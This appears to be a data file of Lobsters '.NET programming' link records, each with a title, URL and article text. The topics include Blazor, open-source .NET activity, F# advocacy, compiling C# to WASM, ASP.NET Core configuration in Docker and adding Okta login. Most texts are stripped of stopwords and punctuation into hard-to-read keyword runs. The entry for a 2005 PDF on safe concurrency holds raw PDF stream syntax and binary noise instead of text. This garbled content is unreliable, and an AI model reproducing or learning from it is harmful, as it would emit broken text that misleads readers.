communication browser thinclient server small binary packet however web socket used client server must always connected mean razor component apps work offline mode offline mode must application webassembly equivalent blazor application may better choice said blazor yet receive official release date promise support microsoft scale azure one last point concern may question razor component scale since razor component built signalr advantage azure azure signalr service fully managed service infrastructure work seamlessly aspnet core signalr integrating signalr service requires little code modification add automatic capacity provisioning scaling persistent connection wrapping razor component serverside implementation blazor framework new take web development utilizing web browser thinclient razor component offer new alternative javascript framework component model simple enough maintains short learning curve yet robust enough extremely productive even though razor component new ability use existing net library tooling optionally javascript ecosystem well make strong candidate frontend web development post part second annual c advent check advent calendar great post
213,Lobsters,dotnet,"C#, F#, .NET programming",Open Source .NET – 4 years later,http://www.mattwarren.org/2018/12/04/Open-Source-.Net-4-years-later,open source net year later,open source net year later open sourcing large part net framework new feature net core aspnet core sidenote runtime change significant internals coreclr dotnet run hello world commits issue project significant net core runtime coreclr info like type tiered compilation info crossplatform osxxx label new cpu architecture hardware intrinsics project default interface method project performance monitoring diagnostics project readytorun image localgc project unloadability project repository activity time level activity repo issue pull request sparklines ftw process note issue pull request visual studio code total participation november november microsoftcommunity split samsung engineer note permonth november november note summary thriving open source product,open source net year later dec word little year ago microsoft announced open sourcing large part net framework slide new feature net core aspnet core show community contributing significant way sidenote post form part ongoing series want see thing changed time check previous one runtime change look number want take moment look significant runtime change taken place last year partly really like looking internals coreclr also runtime one repository make others possible rely give context slide presentation called dotnet run hello world flick see component make coreclr codebase make application run bit digging commits issue project list significant change net core runtime coreclr last year missed please let know span info reflike like type support span tiered compilation info crossplatform unix o x etc see list osxxx label new cpu architecture hardware intrinsics project default interface method project performance monitoring diagnostics project readytorun image localgc project unloadability project quite large fundamental change runtime since opensourced repository activity time onto data first going look overview level activity repo analysing total number issue created pull request closed per month sparklines ftw interested got data see previous post process note number black recent month red dot showing lowest green dot highest previous value toggle issue pull request clicking button hover individual sparklines get tooltip showing permonth value click project name take github page repository data give good indication healthy different repos growing time staying also see different level activity repo compare one whilst clear visual studio code way ahead repos issue interesting see netonly one still pretty large notably corefx baseclass library roslyn compiler coreclr runtime next look total participation last year ie november november pull request issue treated equally large pr count one fix speling mistake whilst ideal simplest way get idea microsoftcommunity split addition community include people paid company work net project instance samsung engineer note hover bar get actual number rather percentage issue microsoft community pull request microsoft community finally see permonth data last year ie november november note inspect different repos selecting pulldown list aware yaxis graph rescaled maximum value change time issue microsoft community pull request microsoft community summary clear community continues invested netrelated open source repository contributing significantly sustained period time think good net developer whether contribute os net thriving open source product many benefit
215,Lobsters,dotnet,"C#, F#, .NET programming",Safe Concurrency for Aggregate Objects with Invariants (2005),https://www.microsoft.com/en-us/research/wp-content/uploads/2005/01/SafeConcurrencySEFM2005.pdf,safe concurrency aggregate object invariant,,obj length filter flatedecode stream occ hm h r n gwkb ܗ r g f wf p u endstream endobj obj type page content r resource r mediabox parent r endobj obj font r r r r r r r r r r r procset pdf text endobj obj length filter flatedecode stream j x xwôad q sh x vyv j j e dy q endstream endobj obj type page content r resource r mediabox parent r endobj obj font r r r r r r r r r r r r r procset pdf text endobj obj length filter flatedecode stream l z c ĉ ϟ ql u lk v j ț xp h endstream endobj obj type page content r resource r mediabox parent r endobj obj font r r r r r r r r r r r r r r r r procset pdf text endobj obj length filter flatedecode stream xڽ u jߑ e myzö k q nz k ha u 䋣 xu u wi j v f endstream endobj obj type page content r resource r mediabox parent r endobj obj type xobject subtype form formtype ptexfilename objectlifecyclepdf ptexpagenumber ptexinfodict r matrix bbox resource procset pdf text extgstate r font r r r r length r filter flatedecode stream l ϻz l x g e z p hp ۃ k z р h endstream endobj obj producer miktex gpl ghostscript creationdate moddate title microsoft powerpoint objectlifecycleppt creator version author tbartj endobj obj type extgstate name tr identity bg r ucr r endobj obj basefont courier type font name subtype endobj obj basefont helveticabold type font name subtype endobj obj basefont helveticaoblique type font name subtype endobj obj basefont helvetica type font name encoding r subtype endobj obj endobj obj filter flatedecode functiontype domain range bitspersample size length stream endstream endobj obj filter flatedecode functiontype domain range bitspersample size length stream endobj obj type encoding difference endobj obj font r r r r r r r r r r r r r r r r r r xobject r procset pdf text endobj obj length filter flatedecode stream ӊ g b 渊 u c ы n
216,Lobsters,dotnet,"C#, F#, .NET programming",Why your F# evangelism isn't working (2015),https://ericsink.com/entries/fsharp_chasm.html,f evangelism nt working,f evangelism nt working ouch eric one antif people nt current side project eric wrong f mainstream already wrong f evangelism working chasm herd thing work pragmatist nt care way f better maybe need better job explaining benefit f pragmatist stupid fine nt need pragmatist anyway right chickenandegg situation hopeless especially hard f cross chasm hybrid functionalfirst language cross chasm together swift go mainstream f eric wrong know pragmatist using f,f evangelism nt working ouch eric one antif people nt nope skim blog entry quickly read title might think someone like f nothing could truth last several month become big f fan become preferred language personal project current side project keyvalue store f learned lot writing even starting think might end becoming useful mostly find coding f extremely satisfying writing article opponent f rather someone hope f become mainstream net language eric wrong f mainstream already course definition mainstream f gaining traction really fast people using f real stuff language improving xamarin supporting nearly measure f showing lot momentum last year f fan nt bad news running around article using definition mainstream explain believe f yet reached arrive end article like definition mainstream okay take copy article search replace instance word mainstream purple desire argue mainstream mean want argue meaning purple happy wrong f evangelism working course certain extent marketing terminology far tell f user today early adopter pragmatist f yet crossed chasm chasm term originates book geoffrey moore main point moore book classical marketing bell curve problem typically prior moore book always bell curve drawn like basic idea curve market adopts new techology follows pattern technology move left right bell curve becoming adopted four group following order early adopter people like trying new technology pragmatist people care technology get something done conservative pragmatist even riskaverse laggard people actively avoid new thing together pragmatist conservative definition mainstream purpose article moore key observation moving early adopter pragmatist hard technology never make illustrate problem moore suggests drawing bell curve differently chasm early adopter pragmatist book explains chasm exists technology die bottom chasm technology successfully cross chasm marketing classic highly recommended purpose blog entry main thing need know chasm exists pragmatist generally adopt new techologies herd nt adopt new technology see pragmatist using creates chickenandegg problem herd thing work pragmatist annual conference agree stay existing technology actual vote formal consensus get reached lot process happens hallway dining hall considering window stay window see happens next process happens conference see session title like safe ignore mobile another year pragmaticon ratified platform looked something like sql still safe choice keep eye developer make sure using ruby exchange still best email solution cloud okay thing important data need stay server room let ignore byod hope go away building mobile app still expensive risky pragmatist nt care way f better really point title blog entry come trying explain benefit f pragmatist probably frustrated probably seems like listening pragmatist nt make technology decision basis better prefer safety herd pragmatist want using technology pragmatist even everybody somewhat unhappy choose predictably disappointing excellent unproven every time maybe need better job explaining benefit f would nt great simple early adopter nothing say pragmatist make difference know opinion experience trusted share value pragmatist stupid decisionmaking process quite rational natural consequence someone us technology get something done rather using technology sake near top blog entry said find coding f extremely satisfying remark identifies early adopter something pragmatist would never say pragmatist accidentally stumbled across blog entry stopped reading right pragmatist nt care craft software nt care cool something care car investment law soap oil rig health care construction transportation insurance technology tool btw find word pragmatist tedious pronounce refer folk commonlyused label normal people fine nt need pragmatist anyway right maybe thing stay land early adopter forever area bell curve matter roughly equivalent revenue together pragmatist conservative represent almost money market situation allows successful given technology even though get used early adopter great many people directly indirectly placing bet financial otherwise pay technology get used majority market chickenandegg situation hopeless quite sometimes pragmatist convinced break herd key find moore call pragmatist pain pragmatist pain someone whose need well met whatever technology current popular among pragmatist current technology merely annoying failing pragmatist pain actually care f better even though go nature really hate idea listening f nerd prattle immutability type inference reached last resort pain forced look hope somebody outside herd new product get across chasm find pragmatist pain whateverittakes make happy product go back repeat enough customer go pragmaticon without shunned ridiculed especially hard f cross chasm c really really good love c hold opinion f better kirk better khan everything also understand f awesomeness basically irrelevant question whether go mainstream pragmatist pain interested c nt cause much pain hybrid functionalfirst language cross chasm together mostly certainly true f part trend java world scala appleios world swift merely true f gaining momentum also true functional programming gaining momentum term going mainstream three language relatedbutseparate swift cross chasm first add bit momentum f simply two language seen comparables different ecosystem f cross chasm swift go mainstream f yes f seven year head start swift cross chasm first nothing relative merit two language january f quite stable trustworthy use case swift mostly unstable mess nt ready prime time irrelevant simple fact c kinda great objectivec kinda dreadful swift go mainstream first ca nt swing appleios ecosystem without hitting pragmatist pain eric wrong know pragmatist using f really great please spread word
217,Lobsters,dotnet,"C#, F#, .NET programming","F# spoiled me, or why I don’t enjoy C# anymore",https://medium.com/@liman.rom/f-spoiled-me-or-why-i-dont-enjoy-c-anymore-39e025035a98,f spoiled enjoy c anymore,f spoiled enjoy c anymore really used like c ok good force fully initialize object upon declaration discriminated union far surprise according requirement solid paradigm away familiar oop affected statically resolved type parameter computation expression file structure project default sum f fun profit russian community telegram,f spoiled enjoy c anymorei really used like c primary language every time compared popular language happy accidentally chose python javascript lack static typing assuming j kind typing java lack proper generic property event value type brings mess wrapper class like integer oni mention comparing language comfort writing without covering topic tool environment since decent enough make enterprise development reasonable comfortableand tried f curiosityok good briefly following immutability defaultfunctional paradigm turned solid concise call oop todaysum type discriminated unionscomputation expressionssrtp statically resolved type parametersnull safetylaconic syntaxtype inferencewell null part easy one nothing foul code endless check returned value like task ienumerable employee let talk immutability conciseness consider following poco class public class employee public guid id get set public string name get set public string email get set public string phone get set public bool hasaccesstosomething get set public bool hasaccesstosomethingelse get set brief simple nothing redundant shorter look f equivalent type employee id guid name string email string phone string hasaccesstosomething bool hasaccesstosomethingelse bool truly nothing redundant useful information contained type keyword type name field name type c useless public get set every line besides f got null safety immutability well actually get immutability c public thing big problem autocomplete public class employee public guid id get public string name get public string email get public string phone get public bool hasaccesstosomething get public bool hasaccesstosomethingelse get public employee guid id string name string email string phone bool hasaccesstosmth bool hasaccesstosmthelse id id name name email email phone phone hasaccesstosomething hasaccesstosmth hasaccesstosomethingelse hasaccesstosmthelse done although amount code tripled field repeated twice add new field easily forget add constructor parameter andor initialize compiler say anything f hand add new field add initialization look like let employee id guidnewguid name peter email peter gmailcom phone hasaccesstosomething true hasaccesstosomethingelse false miss field code compile since object immutable way make change create another one need change one field piece cake let employee name bob c guess already know besides get thing good unless inside object immutable gon na take care even mention collection really need immutability much added access field purpose real project typically access service responsible quite often receives model mutates setting access field true needed point program get model access field set false mean could model nt put service could field forgotten taken care maybe employee nt access nt know check read lot codebut structure immutable know everything fine since compiler force fully initialize object upon declaration case upon adding new field check place object created maybe fill field toocheck service mutating objectwriteupdate unit test related objectpossibly update mappingsdealing immutable object also certain code thread corrupt inside c hard get real immutability writing immutable code worth effort need immutability costbut enough else got f also got free structural equalitystructural comparisonso code would exactly meant real equality equal compare object reference pure garbage already got objectreferenceequals thanksone could argue one need since real life project compare object rarely big deal override equal gethashcode manually think causeeffect relationship going backwards nt compare regular object manual overriding maintaining equal compare take enormous effort however come free use found immediately put hashset sortedset use key dictionary nt bother comparing object id compare although id option still available course discriminated unionsi suppose u learned first teamlead knee building workflow exception wrong instance instead using try catch exception better use inttryparse besides primitive decrepit example constantly break rule user provided crooked input validationexception array bound indexoutofrangeexception clever book say exception exceptional unpredictable situation something gone wrong badly trying continue work make sense good example outofmemoryexception stackoverflowexception accessviolationexception getting bound array unpredictable really mean indexer get input possible value case array work nt exceed length rarely million mean far value int cause exception one work correctly mean given random value int far likely get exceptional situation normal one know one us random index array everyone check length wonder still pretty representative imagine talking abstract function handle input type find value cause exception kinda annoying nt thing go validation user provided wrong data surprisethe reason dramatic abusing exception simple type system powerful enough represent scenario like everything fine give result otherwise return error strict typing requires u return type every execution branch fortunately adding string errormessage issuccess model last thing need therefore c reality exception probably lesser evil course could something like public class result tresult terror public bool isok get set public tresult result get set public terror error get set need write lot code order make invalid state unrepresentable otherwise initialize result error forget set isok really brings problem solvesin f define thing much easier type result tresult terror ok tresult error terrortype validationresult tinput valid tinput invalid string listlet validateandexecute input match validate input check validation result valid input ok execute input valid return execution result invalid message error message return error list messagesit simple concise importantly code selfdocumented write xml doc specify method throw exception scenario wrap method call trycatch case kind type system exception occur truly dangerous wrong situationswhen throw exception time need sophisticated error handling get businessexception apiexception inherit ton exception keep tracking everyone using right exception someone make mistake client get instead got tedious log reading digging stacktraces ahead youf compiler give warning go case match expression convenient add new case du du define scenario instance type usercreationresult usercreated id guid invalidchars errormessage string agreetotermsrequired emailrequired alreadyexistsnow see possible outcome operation far representative list exception added new case agreetotermsrequired according new requirement f compiler gave warning handle resulti never seen descriptive list exception project obvious reason scenario defined text message exception instead result get duplicate occasionally opposite developer get lazy make message abstractby way array indexation also look prettier none ifelse length check let dosmth myarray index match arraytryitem index myarray elem consolewriteline elem none use type standard lib type option nonewhich better alternative null missing value case better whenever see know value missing according requirement developer mistake compiler keep eye making go possible casessolid paradigmpure function expressionbased language design force u write extremely stable code pure function satisfy following criterion function side effect execution result evaluated outputfunction always produce output inputadd totality function produce correct output every possible input top get solid predictable threadsafe code always work rightexpressionbased design tell u everything expression everything execution result instance let somecondition else force u write possible branch stop need else code wo nt compile impossible forget scenarioin c ternary operator thing also quite easy write unsafe code define something mutate part missed somethingaway familiar oopcommon case got service depends service repository service dependency get mixed together nasty cocktail functionality mighty di framework handed web controllereach dependency service dependency average including guy method average used every specific scenario course giant method tree every specific case need method every dependency anyway tie together create lot object mock course would think test beauty want test method service order call need object service create object pas mock trick know specific mock need mock called need others couple method every time got tedious setup test specifying return value stuff want test another case method setup sometimes code test method method oh yes every method dig inside gut take look specific dependency gon na need time way go encapsulationand kick u way whenever need method service satisfy dependency even actually need course handled di framework still go register often problem dependency declared another assembly reference case screw architecture mess inheritance move piece code separate service increasing number component system doable course still quite unpleasantin functional world done different way coolest guy pure function object mostly deal immutable value mutable variable besides function easily composed case even need object service repository get db something need well get pas value repo simple case could look like let getreport querydata use connection getconnection querydata datarepositoryget connection connection dependency injected function constructor nt need keep tracking lifesycle dependency reportbuildfor unfamiliar operator currying equivalent following code let gerreport querydata use connection getconnection reportbuild datarepositoryget connection querydata c public reportmodel getreport querydata querydata using var connection getconnection report static class f module translated return reportbuild datarepositoryget connection querydata since function easily composed like let getreport querydata use connection getconnection querydata datarepositoryget connection reportbuild please note reportbuild tested far easily nt need mock framework fscheck generate hundred input parameter run test showing broken proper kind testing cause test like truly try crucify system unittests like gently tickle itall run test define generator type better mock generator universal apply future test need know implementation anything creating themby way business logic assembly reference assembly repository one interface mean wan na switch example entityframework dapper bl assembly affected allstatically resolved type parametersit better show tell let inline square x static member x xthis function work every type multiplication operator satisfying signature work operator usual method let inline getbodyasync x member getbodyasync unit b x open systemthreadingtaskstype member thisgetbodyasync taskfromresult b member thisgetbodyasync async return getbodyasync fun x xresult getbodyasync asyncrunsynchronously need make wrapper interface need type right method know c computation expressionswe used example result type consider cascade operation return result result error wan na stop execution pointinstead writing endless ladder like let re arg match dojob arg error e error e ok r match r error e error e ok r define type resultbuilder member bind x f match x error e error e ok x f x member return x ok x member returnfrom x xlet result resultbuilder use everywhere like let re arg result let r dojob arg let r let return every line let case error e return error everything ok return thing ok thing like anything including custom operation custom name great tool making dslby way thing like asynchronous programming even two task async first one familiar task second one working async class thing f main difference task cold start also integration task api build complex async workflow parallel andor cascade execution run ready like let mytask task let result dosmthasync like await task let dosmthelseasync result return let myasync async let result doasync let result return let myasync asyncrunsynchronouslylet myasync asyncstartastasklet mytask asyncawaittaskfile structure projectssince record discriminated union definition short much kind type project usually number file project reduced dramatically domain type defined filealso f file order code order matter default use given line code something declared higher done design extremely great cause prevents u making cycle dependency also help greatly code review file order reveals design mistake highlevel component defined high hierarchy someone screwed dependency tell glimpse imagine long would take dealing c sum uponce got powerful tool got used begin solve problem much faster gracefully code written tested work forever going back c mean lose productivity riding motorcycle back riding bicycle mean c good f awesome would need something good awesome one right yeah c slowly getting feature nullable reference type pattern matching maybe even record feature come huge delay much weaker comparing f nullable reference type good option far better several reason pattern matching powerful record guess wo nt like syntax still paradigm problem strip u code stability propertybased test test actually revealed design mistake several time even making commit would take really long time qa team find something like thatunit test hand usually reveal forgot update test configuration yes sometimes show missed something code something would even compile f would say biggest problem f hard sell c devs try gon na easy plenty awesome book absolutely wonderful website f fun profit also wonderful russian community telegram english speaker also welcomeso strongly encourage give f try gon na fun
218,Lobsters,dotnet,"C#, F#, .NET programming",Compiling C# to WASM with Mono and Blazor then Debugging .NET Source with Remote Debugging in Chrome,https://www.hanselman.com/blog/CompilingCToWASMWithMonoAndBlazorThenDebuggingNETSourceWithRemoteDebuggingInChromeDevTools.aspx,compiling c wasm mono blazor debugging net source remote debugging chrome,mono xamarin compile c web assembly left blazor flightfinder real blazor application web assembly prescient chrome devtools protocol limited sponsor latest jetbrains rider hosting,blazor quietly march case nt heard blogged blazor based deceptively simple idea could run net standard code browser silverlight blazor requires plugins nt introduce new ui concept took aot ahead time compilation work pioneered mono xamarin compile c web assembly wasm added nice ui embraced html dom sound bonkers hater think solution dumb left want wacky amazing consider command line cat hellocsclass hello static int main string args systemconsolewriteline hello world return mc nostdlib noconfig r distlibmscorlibdll hellocs helloexe monowasm helloexe output l outputhelloexe indexhtml indexjs indexwasm mscorlibdll could browser look closely right side see mono runtime compiled wasm coming note blazor compiling app wasm sending mono compiled wasm client sending net standard application dlls unchanged run within context client side runtime using open web tool open source blazor allows make spa single page apps much like angularvuereact etc apps today except writing c razor html consider basic example page counter counter p current count currentcount p button class btn btnprimary onclick incrementcount click button function int currentcount void incrementcount currentcount hit button call c increment variable variable referenced higher automatically updated trivial example check source flightfinder real blazor application stupid scott debug mess see using chrome seriously compiling c running browser web assembly prescient undebuggable black box mess right say nay nay c usersscottdesktopsweetsassymollassy env aspnetcoreenvironment development c usersscottdesktopsweetsassymollassy dotnet run configuration debughosting environment developmentcontent root path c usersscottdesktopsweetsassymollassynow listening http listening http started press ctrlc shut winr run command shutting chrome instance programfiles googlechromeapplicationchromeexe http blazor app running hit shiftaltd shiftsillymackeyd behold feel free click zoom breakpoint c within razor page chrome devtools blazor provides debugging proxy implement chrome devtools protocol augments protocol netspecific information debugging keyboard shortcut pressed blazor point chrome devtools proxy proxy connects browser window seeking debug hence need enable remote debugging getting started limited awesome amazing work done lot team coming together lovely new choice open source web sponsor preview latest jetbrains rider assembly explorer git submodules sql language injection integrated performance profiler advanced unity support hosting
220,Lobsters,dotnet,"C#, F#, .NET programming",Troubleshooting an ASP.NET Core App Running in Docker,https://www.telerik.com/blogs/troubleshooting-an-aspnet-core-app-running-in-docker,troubleshooting aspnet core app running docker,aspnet core action article nt aspnet core environmentspecific configuration loading andrew lock tl dr aspnet core environment aspnet core configuration primer json file xml file environment variable pretty much anywhere environmentspecific configuration overwrite default value use different configuration provider setting load additional configuration provider user secret azure key vault problem environmentspecific configuration loading described last post strongly typed setting validation troubleshooting linux filesystem casesensitivity script last post summary,friend colleague paul ballard shared andrew lock recent article issue missing connection string error new aspnet core application running docker andrew author new book aspnet core action graciously allowed u repost article article cover basic background environment aspnet core also describes would use environmentspecific configuration describes bug provides solution andrew lock u fulltime developer working predominantly full stack aspnet development devon uk hope enjoy nt aspnet core environmentspecific configuration loading andrew lock recently standing new aspnet core application running docker seeing strange behaviour application would start without problem running locally window machine pushed build server application would immediately fail citing missing connection string something similar spent good half hour trying figure issue post case someone else run problem post cover basic background environment aspnet core describe would typically use environmentspecific configuration finally describe bug ran issue tl dr ihostingenvironment ignores case current environment use isdevelopment extension method etc however using environmentspecific configuration file appsettingsdevelopmentjson example must pay attention case setting enviroment development instead development result configuration file loading casesensitive o like linux aspnet core environment aspnet core concept environment represent different location code might running determine current environment runtime use value change behaviour app somehow example startupconfigure common configure middleware pipeline differently running development opposed production public void configure iapplicationbuilder app ihostingenvironment env added running development envisdevelopment appusedeveloperexceptionpage added running production envisproduction appuseexceptionhandler error appusestaticfiles appusemvc use ihostingenvironment anywhere application want check current environment behave differently based value aspnet core knowledge three environment default provides extension method working development identified using ihostingenvironmentisdevelopment staging identified using ihostingenvironmentisstaging production identified using ihostingenvironmentisproduction also see value current environment reading ihostingenvironmentenvironmentname directly highly recommended use one extension method extension method take care make caseinsensitive comparison environmentname expected string ie development litter code imperative check environment generally cleaner approach use environmentspecific configuration describe shortly aspnet core configuration primer configuration system aspnet core built layer configuration value compiled multiple source load value json file xml file environment variable create custom provider load value pretty much anywhere build configuration object adding provider iconfigurationbuilder object typically happens programcs using iwebhostbuilderconfigureappconfiguration method webhostcreatedefaultbuilder call method behind scene typical aspnet core app provider added iconfigurationbuilder add another layer configuration example following code add json file appsettingsjson environment variable final configuration object ihostingenvironment env var builder new configurationbuilder setbasepath envcontentrootpath path json file loaded addenvironmentvariables order configuration provider important environment variable name setting json file overwrite json setting final configuration flattened view setting configuration source think flattening configuration provider similar flattening layer photoshop image layer overwrites value previous layer except transparent ie layer nt value example imagine following appsettingsjson configuration file logging loglevel default debug system information microsoft information would generate following setting logging loglevel default debug logging loglevel system information logging loglevel microsoft information however also environment variable logginglogleveldefaultwarning loaded json file final configuration would following note change value first setting logging loglevel default warning logging loglevel system information logging loglevel microsoft information environmentspecific configuration flattening configuration provider allows environmentspecific configuration take common case want use different setting local development compared production number way could achieve example overwrite default value eg set environment variable setting production use different configuration provider setting eg load setting azure key vault production user secret local development load additional configuration provider eg load additional environmentspecific json file last two point essentially thing wanted call different typically used two slightly different thing secret v setting secret api key connection string nt stored inside repository local development sensitive value stored user secret production secret retrieved provider azure key vault contrast setting sensitive value represent something might want configure differently environment example maybe want use caching production write log file different location typical webhostcreatedefaultbuilder method us three approach overwriting different provider additional provider configuration method default builder shown default builder configures configuration provider default json file called appsettingsjson environmentspecific json file called appsettingsenvironmentjson environment name current environment user secret development environment environment variable command line argument argument passed rest post going focus environmentspecific json file caused issue encountered problem environmentspecific configuration loading part new net core app building running smoke test docker container produced described last post involves running docker container build server checking container start correctly idea double check initial configuration occurs app start correct one check strongly typed setting validation run successfully ran smoke test first time new app setting validation thirdparty api url failed odd tested application locally running smoke test typically set hosting environment app development sometimes testingspecific environment testing inside appsettingsdevelopmentjson file could see offending configuration value reason application running docker smoke test value nt bound correctly next section briefly describe thing thought looked troubleshooting tried debugging locally adding removing file changing setting value trying confirm file definitely loaded correctly setting nt coming somewhere else running locally everything correct checked unexpected environment variable overwriting value app running docker smoke test nt looked inside docker container double checked appsettingsdevelopmentjson file existed right place everything looked ok finally checked actually running environment expected development looking log container smoke test ran could see hosting environment correct according app point somewhat stumped run idea made coffee sat opened smoke test script file answer hit linux filesystem casesensitivity smoke test script using similar script last post command using run new app smoke test shown problem statement set environment variable define hosting environment using set environment development development aspnet core careful differentiate environment based case ihostingenvironment extension method like isdevelopment case insensitive long use extension method nt use ihostingenvironmentenvironmentname directly fine however one place common use environmentname directly app configuration earlier described common approach environmentspecific configuration adding extra appsettingsjson file see directly using environmentname calculate environmentspecific json configuration file smoke test script environmentname development app looking appsettingsdevelopmentjson file file actually called appsettingsdevelopmentjson window case difference nt matter aspnet core respect convention host o load file even set environment development fine linux however case sensitive wo nt find file simple fix set environment standard titlecasing small change app able start smoke test succeeded summary always consistent environment name case may matter running window definitely app ever run linux aspnet core framework careful ignore case determining current environment ca nt trust underlying operating system editor note thanks andrew lock allowing u share fix republishing post
222,Lobsters,dotnet,"C#, F#, .NET programming",Add Login to Your ASP.NET Core MVC App,https://developer.okta.com/blog/2018/10/29/add-login-to-you-aspnetcore-app,add login aspnet core mvc app,set aspnet core mvc project download link v code set database sqlite scaffold controller view update layout set authentication login aspnet core foreverfree developer account web done add login registration aspnet core mvc application test aspnet core app login learn aspnet core login okta twitter facebook linkedin youtube channel,one improvement latest version aspnet core mvc new simplified authentication integration however managing authentication still considerable burden need handle signup login also set database manage security aspect registration login take care session management since integration external auth provider never comfortable let see example existing application adding okta set aspnet core mvc project first make sure net core sdk installed download link demo use v code feel free use preferred editor create new mvc project inside folder store code run following dotnet new mvc n oktamvclogin set database sqlite create new folder called data within root folder project inside folder create two file first one database model employeecs namespace oktamvclogindata public class employee public string id get set public string name get set public int age get set inside data folder create new file applicationdbcontextcs past following inside using microsoftentityframeworkcore namespace oktamvclogindata public class applicationdbcontext dbcontext public applicationdbcontext dbcontextoptions applicationdbcontext option base option public dbset employee employee get set using sqlite therefore need add appropriate nuget package dotnet add package microsoftentityframeworkcoresqlite inside startup class add following namespaces using microsoftentityframeworkcore using oktamvclogindata also inside configureservices method startup class add following line servicesadddbcontext applicationdbcontext option optionsusesqlite data sourceoktadb inject applicationdbcontext configure method adding new parameter public void configure iapplicationbuilder app ihostingenvironment env applicationdbcontext dbcontext start method add following line dbcontextdatabaseensurecreated scaffold controller view scaffolding work need install code generator tool dotnet tool install global dotnetaspnetcodegenerator dotnet add package microsoftvisualstudiowebcodegenerationdesign use existing model dbcontext class generate controller matching view dotnet aspnetcodegenerator controller async employee dc applicationdbcontext name employeescontroller outdir controller udl update layout navigate viewssharedlayoutcshtml file locate following section ul class nav navbarnav li asparea aspcontroller home aspaction index home li li asparea aspcontroller home aspaction li li asparea aspcontroller home aspaction contact contact li ul replace section following code ul class nav navbarnav li asparea aspcontroller home aspaction index home li useridentityisauthenticated li asparea aspcontroller employee aspaction index employee li ul set authentication login aspnet core handling authentication never easy comfortable task want quickly easily take care authentication application probably use solution work preferably one actively maintained someone else people love use okta take minimum amount time get started okta secure existing application sign foreverfree developer account log already one completed login registration see dashboard upper right corner unique org url save later need create new application browsing application tab click add application first page wizard choose web setting page enter following value name oktamvclogin base uris http login redirect uris http logout redirect uris http leave value unchanged click done application created copy client id client secret value following page need soon course different never easier add authorization aspnet core application using okta make whole process even straightforward install official okta nuget package dotnet add package oktaaspnetcore version first add okta detail appsettingsjson file top file logging section paste following code okta clientid oktaclientid clientsecret oktaclientsecret domain http youroktadomain add following namespace top startupcs file using microsoftaspnetcoreauthenticationcookies using oktaaspnetcore add detail identity provider application inside configureservices method add following servicesaddauthentication option optionsdefaultauthenticatescheme cookieauthenticationdefaultsauthenticationscheme optionsdefaultsigninscheme cookieauthenticationdefaultsauthenticationscheme optionsdefaultchallengescheme oktadefaultsmvcauthenticationscheme addcookie addoktamvc new oktamvcoptions oktadomain configuration okta domain clientid configuration okta clientid clientsecret configuration okta clientsecret rest configureservices servicesaddmvc setcompatibilityversion section set authentication scheme aspnet core addauthentication extension also set okta detail using extension method addoktamvc available okta nuget package add following configure method appusemvc line finally add authorize attribute employeescontroller class inside employeescontrollercs file add following using using microsoftaspnetcoreauthorization employeescontroller class name add authorization attribute authorize public class employeescontroller controller code ensures request controller allowed authorized user add login registration aspnet core mvc application create new file inside controller folder accountcontrollercs paste following inside file using microsoftaspnetcoreauthenticationcookies using microsoftaspnetcoremvc using oktaaspnetcore namespace oktamvccontrollers public class accountcontroller controller public iactionresult login httpcontextuseridentityisauthenticated return challenge oktadefaultsmvcauthenticationscheme return redirecttoaction index home httppost public iactionresult logout return new signoutresult new oktadefaultsmvcauthenticationscheme cookieauthenticationdefaultsauthenticationscheme inside login method make sure user authenticated system challenge okta mvc auth scheme okta handler make sure check user authentication status needed okta code automatically redirect user login screen logout method make sure user signed cookie okta custom scheme inside viewsshared folder create new file loginpartialcshtml paste following code useridentityisauthenticated ul class nav navbarnav navbarright li p class navbartext hello useridentityname p li li onclick documentgetelementbyid logoutform submit style cursor pointer log li ul form aspcontroller account aspaction logout method post id logoutform form else ul class nav navbarnav navbarright li aspcontroller account aspaction login log li ul modify viewssharedlayoutcshtml find following code ul class nav navbarnav li asparea aspcontroller home aspaction index home li li asparea aspcontroller employee aspaction index employee li li asparea aspcontroller home aspaction li li asparea aspcontroller home aspaction contact contact li ul immediately add following line partial name loginpartial test aspnet core app login open terminal enter following command restores needed nuget package compiles start application application running following address http open browser look like clicking login redirected okta login page see page like following picture successfully logged able see employee link main navbar clicking take following screen add new record update delete existing one learn aspnet core login okta making web application need spa framework aspnet core mvc probably best choice imagine cool feature rail django node express controller powerful routing extensible pluggable framework migration filter powerful view engine tdd friendly scaffolding controller view add top one robust definitely fastest major web framework aspnet core aspnet core mvc framework combine goodness aspnet core crossplatform builtin di powerful configuration framework fast robust easy get started feature old aspnet mvc hope saw easy get started mvc help net core cli v code even easier add login application using okta great resource check always question feel free post comment forget follow u twitter facebook linkedin also check youtube channel
223,Lobsters,dotnet,"C#, F#, .NET programming",A Breakdown of Blazor Project Types,https://www.telerik.com/blogs/a-breakdown-of-blazor-project-types ,breakdown blazor project type,blazor experimentation blaze installation net core sdk visual studio aspnet blazor language service extension important set blazors run new aspnet core web application blazor clientside github page azure storage static website hosting bootstrap key difference project type application hosted relation data consumes counter fetch data blazor fullstack blazorserver middleware blazorclient blazorshared aheadoftime compilation aot view rendered clientside blazor serverside aka razor component dotnetconf aspnet razor component signalr need webassembly app server pro con conclusion,discus three project type available blazor get understanding scenario apply explore expect blazor singlepage web application spa framework built net run browser mono webassembly runtime serverside via signalr blazor feature component architecture routing virtual dom javascript interoperability interop api currently blazor experimental state allows rapid development iteration implied experimentation blazor shipped march within month rolled blazor short roughly six month history already launched variety project type onboard developer varying application need article well discus three project type available get understanding scenario apply expect jump evaluate serverside clientside fullstack think seen make sure peek serverside project type may turn quite different one might expect get started page let begin blazor prerequisite blaze blazor unsupported experimental web framework nt used production workload time writing blazor shipping rate every two month project nature new tooling must installed blazor project template available visual studio applies dotnet command line interface cli installation type developer spends majority time visual studio luck visual studio likely provide best experience blazor infancy however dotnet cli still quite handy setting visual studio requires following step install net core sdk later install visual studio later aspnet web development workload selected install latest blazor language service extension visual studio marketplace important default globaljson file included blazor project template may cause project fail load run nt version net core sdk installed globaljson file pin project nt specific version range installed project fails load run even newer sdk installed workaround remove globaljson file project install version net core sdk installation process add three project type covering blazor component library project fourth final project type available cli time blazor component library outside scope article since nt executable project type make template available dotnet cli open command console run following command dotnet new microsoftaspnetcoreblazortemplates set blazors run tooling installed ready run explore blazor project new aspnet core web application dialog new project type found reveal dialog select file new project web aspnet core web application make sure net core aspnet core later selected top choose blazor template select ok let breakdown project type left right blazor clientside blazor aspnet core hosted fullstack blazor serverside aspnet core serverside denotes unofficial short description know find project template discus detail selection blazor clientside blazor clientside template compared html cs javascript application similar spa framework however case blazor javascript supplemented net c via webassembly unlike aspnet mvc 